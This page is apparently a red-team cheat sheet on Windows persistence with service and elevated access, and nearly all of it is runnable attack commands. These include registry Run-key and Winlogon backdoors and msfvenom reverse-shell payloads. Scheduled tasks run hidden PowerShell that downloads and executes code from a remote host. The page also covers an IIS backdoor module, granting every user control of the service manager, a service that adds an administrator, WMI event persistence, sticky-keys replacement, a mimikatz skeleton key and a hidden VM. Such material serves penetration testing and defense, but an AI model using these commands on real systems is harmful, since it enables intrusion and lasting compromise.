<!-- provenance: InternalAllTheThings docs/redteam/persistence/windows-persistence.md @ 203bb0c | part 2/3: Windows Persistence - Service Land and Elevated | converted for Agent Skills; see ../../NOTICE.md -->

# Windows Persistence - Service Land and Elevated

## Serviceland

### IIS

IIS Raid – Backdooring IIS Using Native Modules

```powershell
$ git clone https://github.com/0x09AL/IIS-Raid
$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

### Windows Service

Using SharPersist

```powershell
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
```

## Elevated

### Registry HKLM

Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Microsoft\Windows.

```powershell
Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe
```

Using the command line

```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Evil /t REG_SZ /d "C:\tmp\backdoor.exe"
```

#### Winlogon Helper DLL

> Run executable during Windows logon

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll

reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, evilbinary.exe" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, evilbinary.exe" -Force
```

#### GlobalFlag

> Run executable after notepad is killed

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

### Startup Elevated

Create a batch script in the `ProgramData` startup folder.

```powershell
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
```

### Services Elevated

Create a service that will start automatically or on-demand.

```powershell
# Powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
sc start Backdoor

# SharPersist
SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add

# sc
sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
sc start Backdoor
```

### ServiceSecurityDescriptor

Allow any arbitrary non-administrative user to have full SYSTEM permissions on a machine persistently by feeding an overly permissive ACL to the service control manager with sdset.

**Exploit**:

```ps1
sc.exe sdset <ServiceName> <ServiceSecurityDescriptor>
```

The following command grants full control (`Key Access`) over the Service Control Manager to all users (represented by `WD`, which stands for "World"). In other words, it allows any user to start, stop, modify, or control services through the Service Control Manager, which can be a security risk as it opens service management to everyone on the system.

```ps1
sc.exe sdset scmanager D:(A;;KA;;;WD)
```

* `sc.exe`: The Service Control (sc) command is a Windows utility used for managing services.
* `sdset`: This option sets a Security Descriptor (SD) for a service or the Service Control Manager itself. A security descriptor defines permissions and access rights to system resources.
* `scmanager`: This is the target, referring to the Service Control Manager, which manages the services in the system.

The `ServiceSecurityDescriptor` is defined using the Service Descriptor Definition Language (SDDL).

List the permissions for `scmanager`

```ps1
sc.exe sdshow scmanager
```

Alternatively, you can use [zacateras/sddl-parser](https://github.com/zacateras/sddl-parser) to understand the Security Descriptor Definition Language (SDDL), e.g: `./Sddl.Parser.Console.exe "O:BAG:BAD:(A;CI;CCDCRP;;;NS)"`.

Abuse the weaken configuration to create a service that grants administrator privilege to a custom user `user_basic`.

```ps1
sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators user_basic /add" start= auto
```

Then you need to wait for a reboot for the service to automatically start and grant the user with elevated privilege or any persistence mechanism you specified in the `binPath`.

### Scheduled Tasks Elevated

Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.

> Processes spawned as scheduled tasks have taskeng.exe process as their parent

```powershell
# Powershell
$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
$T = New-ScheduledTaskTrigger -Daily -At 9am
# OR
$T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$S = New-ScheduledTaskSettingsSet
$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
Register-ScheduledTask "Backdoor" -InputObject $D

# Native schtasks
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
schtasks /Create /RU "NT AUTHORITY\SYSTEM" /tn [TaskName] /tr "regsvr32.exe -s \"C:\Users\*\AppData\Local\Temp\[payload].dll\"" /SC ONCE /Z /ST [Time] /ET [Time]

##(X86) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X86) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X86) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 
##(X64) - On User Login
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 
##(X64) - On System Start
schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 
##(X64) - On User Idle (30mins)
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
```

### Windows Management Instrumentation Event Subscription

> An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.

* **__EventFilter**: Trigger (new process, failed logon etc.)
* **EventConsumer**: Perform Action (execute payload etc.)
* **__FilterToConsumerBinding**: Binds Filter and Consumer Classes

```ps1
# Using CMD : Execute a binary 60 seconds after Windows started
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""
# Remove it
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WMIPersist'" | Remove-WmiObject -Verbose

# Using Powershell (deploy)
$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\binary.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
# Using Powershell (remove)
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'WMIPersist'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'WMIPersist'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```

### Binary Replacement

#### Binary Replacement on Windows XP+

| Feature             | Executable                            |
|---------------------|---------------------------------------|
| Sticky Keys         | C:\Windows\System32\sethc.exe         |
| Accessibility Menu  | C:\Windows\System32\utilman.exe       |
| On-Screen Keyboard  | C:\Windows\System32\osk.exe           |
| Magnifier           | C:\Windows\System32\Magnify.exe       |
| Narrator            | C:\Windows\System32\Narrator.exe      |
| Display Switcher    | C:\Windows\System32\DisplaySwitch.exe |
| App Switcher        | C:\Windows\System32\AtBroker.exe      |

In Metasploit : `use post/windows/manage/sticky_keys`

#### Binary Replacement on Windows 10+

Exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable.

Create a malicious **HID.dll** in  `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.

### Skeleton Key

> Inject a master password into the LSASS process of a Domain Controller.

**Requirements**:

* Domain Administrator (SeDebugPrivilege) or `NTAUTHORITY\SYSTEM`

**Exploitation**:

```powershell
# Execute the skeleton key attack
mimikatz "privilege::debug" "misc::skeleton"
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>

# Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### Virtual Machines

> Based on the Shadow Bunny technique.

```ps1
# download virtualbox
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

# perform a silent install and avoid creating desktop and quick launch icons
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
# Disabling notifications
.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

# Download the Virtual machine disk
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

# Create a new VM
$vmname = "IT Recovery"
.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

# Add a network card in NAT mode
.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
.\VBoxManage.exe modifyvm $vmname --nic1 nat
.\VBoxManage.exe modifyvm $vmname --audio none
.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

# Mount the VHD file
.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0

# Start the VM
.\VBoxManage.exe startvm $vmname –type headless 


# optional - adding a shared folder
# require: VirtualBox Guest Additions
.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
# then mount the folder in the VM
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

### Windows Subsystem for Linux

```ps1
# List and install online packages
wsl --list --online
wsl --install -d kali-linux

# Use a local package
wsl --set-default-version 2
curl.exe --insecure -L -o debian.appx https://aka.ms/wsl-debian-gnulinux
Add-AppxPackage .\debian.appx

# Run the machine as root
wsl kali-linux --user root
```
